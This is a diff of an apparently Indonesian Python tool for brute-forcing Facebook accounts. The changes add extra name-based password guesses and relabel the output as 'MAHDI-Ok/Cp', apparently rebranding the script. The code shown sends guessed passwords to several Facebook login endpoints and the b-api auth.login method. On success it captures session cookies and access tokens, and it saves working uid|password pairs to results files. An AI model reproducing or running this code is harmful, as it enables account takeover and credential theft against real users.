@@ -787,7 +787,7 @@ def ___metode___():
         os.remove(___file___)
         exit("\n%s[%sSelesai]%s"%(B,H,B))
     elif ___metode___ in ['6','06']:
-        print("\n%s[%s1%s]%s Gunakan Password [nama,nama123,nama12345]"%(H,P,H,P))
+        print("\n%s[%s1%s]%s Gunakan Password [nama,nama123,nama121,nama1122,nama12345]"%(H,P,H,P))
         print("%s[%s2%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,nama123456]"%(H,P,H,P))
         print("%s[%s3%s]%s Gunakan Password [nama,nama123,nama1234,nama12345,Sayang,Dll]"%(H,P,H,P))
         print("%s[%s4%s]%s Gunakan Password Manual [ >6 ]"%(H,P,H,P))
@@ -847,12 +847,12 @@ def mbasic(ids, uid, pwx, **kwargs):
             gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
             if "c_user" in ses.cookies.get_dict().keys():
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
+                print("\r\x1b[1;92m[MAHDI-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                 ok.append("%s|%s"%(uid, pw))
                 open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                 break
             elif "checkpoint" in ses.cookies.get_dict().keys():
-                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
+                print("\r\x1b[1;93m[MAHDI-Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                 cp.append("%s|%s"%(uid, pw))
                 open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                 break
@@ -884,12 +884,12 @@ def free(ids, uid, pwx, **kwargs):
             gaaa = ses.post("https://free.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8",data=kwargs)
             if "c_user" in ses.cookies.get_dict().keys():
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
+                print("\r\x1b[1;92m[MAHDI-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                 ok.append("%s|%s"%(uid, pw))
                 open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                 break
             elif "checkpoint" in ses.cookies.get_dict().keys():
-                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
+                print("\r\x1b[1;93m[MAHDI-Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                 cp.append("%s|%s"%(uid, pw))
                 open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                 break
@@ -926,7 +926,7 @@ def mobile(ids, uid, pwx, **kwargs):
                 open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                 break
             elif "checkpoint" in ses.cookies.get_dict().keys():
-                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
+                print("\r\x1b[1;93m[MAHDI-Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                 cp.append("%s|%s"%(uid, pw))
                 open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                 break
@@ -958,7 +958,7 @@ def crack(ids, uid, pwx, **kwargs):
             gaaa = ses.post("https://d.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fd.facebook.com%2F&lwv=100&refid=8",data=kwargs)
             if "c_user" in ses.cookies.get_dict().keys():
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
+                print("\r\x1b[1;92m[MAHDI-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                 ok.append("%s|%s"%(uid, pw))
                 open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                 break
@@ -984,7 +984,7 @@ def api(ids, uid, pwx):
             headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
             send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
             if 'session_key' in send.text and 'EAAA' in send.text:
-                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, send.json()['access_token']))
+                print("\r\x1b[1;92m[MAHDI-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, send.json()['access_token']))
                 ok.append("%s|%s"%(uid, pw))
                 open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                 break
@@ -1021,12 +1021,12 @@ def crack2(ids, uid, pwx, **kwargs):
             gaaa = ses.post("https://x.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fx.facebook.com%2F&lwv=100&refid=8",data=kwargs)
             if "c_user" in ses.cookies.get_dict().keys():
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
+                print("\r\x1b[1;92m[MAHDI-Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                 ok.append("%s|%s"%(uid, pw))
                 open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                 break
             elif "checkpoint" in ses.cookies.get_dict().keys():
-                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
+                print("\r\x1b[1;93m[MAHDI-Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                 cp.append("%s|%s"%(uid, pw))
                 open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                 break
